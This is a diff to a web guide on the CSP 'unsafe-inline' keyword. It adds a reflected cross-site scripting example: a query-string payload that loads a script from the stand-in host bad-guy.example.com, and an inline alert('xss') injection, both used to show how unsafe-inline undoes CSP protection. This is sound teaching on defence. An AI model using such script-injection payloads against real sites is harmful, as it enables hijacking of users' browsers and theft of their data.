@@ -1,15 +1,41 @@
 ---
-title: unsafe-inline in Content-Security-Policy
+title: unsafe-inline ⟶ CSP Guide
+description: How to use the unsafe-inline directive in a CSP policy
 layout: layout
 date: Last Modified
 ---
 <div class="jumbotron">
 	<h1>The <code>unsafe-inline</code> Source List Keyword</h1>
-	<div class="lead">The <code>unsafe-inline</code> <strong>Content Security Policy</strong> (CSP) keyword allows the execution of inline scripts or styles.</div>
+	<div class="lead">The <strong><code>unsafe-inline</code></strong> <strong>Content Security Policy</strong> (CSP) keyword allows the execution of inline scripts or styles.</div>
 </div>
 <h2>Warning</h2>
 <p class="lead">Except for one very specific case, you should avoid using the <code>unsafe-inline</code> keyword in your CSP policy. As you might guess it is generally unsafe to use <code>unsafe-inline</code>.</p>
 <p>The <code>unsafe-inline</code> keyword annuls most of the security benefits that <code>Content-Security-Policy</code> provide. </p>
+<p>Let's imagine that you have an app that simply output's a name from the query string variable <code>name</code>, eg:
+<code>Hello #url.name#</code>
+<p>When you hit the URL: <code>/app?name=Pete</code>, the response is <code>Hello Pete</code>. This clearly is an open window for a reflected cross site scripting attack. The attacker can simply inject a script tag:</p>
+<pre>/app?name=&lt;script src="https://bad-guy.example.com/bad-stuff.js"&gt;&lt;/script&gt;</pre>
+<p>When someone requests that URL the <code>bad-stuff.js</code> will execute.</p>
+<p>We can prevent our app from loading JS from <code>bad-guy.example.com</code> using CSP. If we have the following policy:</p>
+<pre>script-src: 'self'</pre>
+<p>Now becuase we specified <a href="/self/" title="CSP self"><code>'self'</code></a> in the <a href="/script-src/"><code>script-src</code></a> directive we can only load JS from the same origin as our app, the request to load a script from <code>bad-guy.example.com</code> will be blocked by CSP!</p>
+<p>CSP will also prevent <a href="/examples/allow-inline-script/">inline scripts from loading, so if you have some legit JavaScript on your site, like this:
+<pre>&lt;script&gt;
+	doSomething();
+&lt;script&gt;</pre>
+<p>That inline script will also be blocked by CSP by default. There are ways to allow it, such as <a href="/nonce/" title="CSP nonce"><code>nonce</code> and <a href="/hash/" title="CSP hash"><code>hash</code>. But the sledge hammer way to allow it would be to add <code>unsafe-inline</code> to your policy. Suppose we added it to our policy:</a>
+<pre>script-src: 'self' 'unsafe-inline'</pre>
+<p>Now, go back to our vulnerable example app and try this:</p>
+<pre>/app?name=&lt;script&gt;alert('xss');&lt;script&gt;</pre>
+<p>We have reopened our XSS hole that was patched by adding CSP.</p>
+<blockquote>
+	Note: We are using <code>alert('xss')</code> as an example of a 
+	function call in JavaScript to illustrate the weaknesses <code>unsafe-inline</code> adds. 
+	In case you ever wondered why everyone is so concerned about the <code>alert</code> function, if you
+	can execute an alert function call, an attacker can probably find a way to execute whatever JavaScript they wanted to.
+	<br>
+	Finally make sure you also patch your XSS vulnerabilities in your app code by properly encoding variables before outputting them.
+</blockquote>
 <h2>What should you use instead of unsafe-inline?</h2>
 <p>When you want to <a href="/examples/allow-inline-script/">allow inline scripts or styles</a> on a page that uses CSP, there two much better options: <a href="/nonce/">nonce</a> or <a href="/hash/">hash</a>.</p>
 
